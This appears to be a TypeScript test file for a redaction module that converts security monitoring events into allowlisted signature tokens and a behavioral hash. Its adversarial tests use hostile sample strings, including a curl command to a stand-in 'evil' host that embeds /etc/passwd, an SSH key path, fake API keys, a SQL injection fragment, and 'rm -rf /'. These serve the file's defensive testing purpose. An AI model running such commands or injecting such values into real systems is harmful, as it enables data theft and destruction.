import { describe, it, expect } from 'vitest';
import { redactEvent, ACTION_CLASSES, TARGET_CLASSES, TACTIC_IDS, isWireTechniqueId } from './redaction';
import { canonicalShape, behavioralHash } from './behavioral-hash';
import type { ARPEvent, MonitorType } from '../../types';

function event(partial: Partial<ARPEvent>): ARPEvent {
  return {
    id: 'e1',
    timestamp: '2026-06-25T00:00:00.000Z',
    source: 'network',
    category: 'threat',
    severity: 'high',
    description: 'x',
    data: {},
    classifiedBy: 'L0-rules',
    ...partial,
  };
}

describe('redactEvent — fail closed', () => {
  it('drops non-anomalous categories (normal traffic is never reported)', () => {
    expect(redactEvent(event({ category: 'normal' }), 'detected')).toBeNull();
  });

  it('drops heartbeat (liveness is not a security behavior)', () => {
    expect(redactEvent(event({ source: 'heartbeat' }), 'detected')).toBeNull();
  });

  it('drops an unknown/future source', () => {
    expect(redactEvent(event({ source: 'quantum-teleport' as MonitorType }), 'detected')).toBeNull();
  });

  it('drops an out-of-enum severity', () => {
    expect(redactEvent(event({ severity: 'apocalyptic' as ARPEvent['severity'] }), 'detected')).toBeNull();
  });

  it('drops an out-of-enum outcome', () => {
    // @ts-expect-error deliberately invalid outcome
    expect(redactEvent(event({}), 'pwned')).toBeNull();
  });
});

describe('redactEvent — produces only allowlisted tokens', () => {
  const sources: MonitorType[] = ['process', 'network', 'filesystem', 'prompt', 'mcp-protocol', 'a2a-protocol', 'skill'];
  for (const source of sources) {
    it(`${source} -> all tokens are in their closed enums`, () => {
      const sig = redactEvent(event({ source }), 'detected');
      expect(sig).not.toBeNull();
      expect(ACTION_CLASSES).toContain(sig!.actionClass);
      expect(TARGET_CLASSES).toContain(sig!.targetClass);
      expect(TACTIC_IDS).toContain(sig!.tacticId);
      expect(isWireTechniqueId(sig!.techniqueId)).toBe(true);
    });
  }
});

describe('redactEvent — adversarial: attacker text can never leak into the signature', () => {
  const ATTACKER_STRINGS = [
    'curl http://evil.example.com/$(cat /etc/passwd)',
    '/home/victim/.ssh/id_rsa',
    'sk-secret-API-KEY-deadbeef',
    'EXFILTRATE-DATA-TO-SERVER; DROP TABLE users;--',
    '10.0.0.5',
    'AKIAIOSFODNN7EXAMPLE',
  ];

  it('attacker-controlled data/description never appears in any output field or the hash preimage', () => {
    const sig = redactEvent(
      event({
        source: 'network',
        category: 'threat',
        description: ATTACKER_STRINGS.join(' '),
        data: {
          command: ATTACKER_STRINGS[0],
          path: ATTACKER_STRINGS[1],
          secret: ATTACKER_STRINGS[2],
          // a free-text technique id MUST be ignored (not in the allowlist)
          techniqueId: ATTACKER_STRINGS[3],
          ip: ATTACKER_STRINGS[4],
        },
      }),
      'detected',
    );
    expect(sig).not.toBeNull();

    const haystack = [
      sig!.tacticId,
      sig!.techniqueId,
      sig!.actionClass,
      sig!.targetClass,
      sig!.sequencePattern,
      sig!.outcomeClass,
      sig!.severity,
      canonicalShape(sig!),
      behavioralHash(sig!),
    ].join(' ');

    for (const bad of ATTACKER_STRINGS) {
      expect(haystack).not.toContain(bad);
    }
    // The technique resolves to the safe mapped value, NOT attacker text.
    expect(sig!.techniqueId).toBe('ATM-T8002');
  });

  it('a free-text data.techniqueId is ignored; an allowlisted one is honored', () => {
    const ignored = redactEvent(event({ source: 'network', data: { techniqueId: 'NOT; A; REAL; ID' } }), 'detected');
    expect(ignored!.techniqueId).toBe('ATM-T8002'); // fell back to mapping

    const honored = redactEvent(event({ source: 'network', data: { techniqueId: 'ATM-T8003' } }), 'detected');
    expect(honored!.techniqueId).toBe('ATM-T8003'); // allowlisted override
  });
});

describe('redactEvent — refinements use explicit flags only, never path content', () => {
  it('filesystem stays file_access unless an explicit credential flag is set', () => {
    const plain = redactEvent(event({ source: 'filesystem', data: { path: '/secrets/.env' } }), 'detected');
    // path string is NOT inspected -> base file_access, not credential_access
    expect(plain!.actionClass).toBe('file_access');
    expect(plain!.targetClass).toBe('file');

    const flagged = redactEvent(event({ source: 'filesystem', data: { credentialAccess: true } }), 'detected');
    expect(flagged!.actionClass).toBe('credential_access');
    expect(flagged!.targetClass).toBe('credential');
  });

  it('network DNS escalation requires an explicit flag, not a string', () => {
    const dns = redactEvent(event({ source: 'network', data: { dns: true } }), 'detected');
    expect(dns!.techniqueId).toBe('ATM-T8003');
  });
});

describe('redactEvent — sequencePattern is built only from recognized tokens', () => {
  it('joins recognized source tokens as actionClasses', () => {
    const sig = redactEvent(event({ source: 'prompt', data: { sequence: ['prompt', 'network'] } }), 'detected');
    expect(sig!.sequencePattern).toBe('prompt_injection>network_egress');
  });

  it('drops the whole pattern if any step is unrecognized (fail closed)', () => {
    const sig = redactEvent(event({ source: 'prompt', data: { sequence: ['prompt', 'rm -rf /'] } }), 'detected');
    expect(sig!.sequencePattern).toBe('');
  });
});
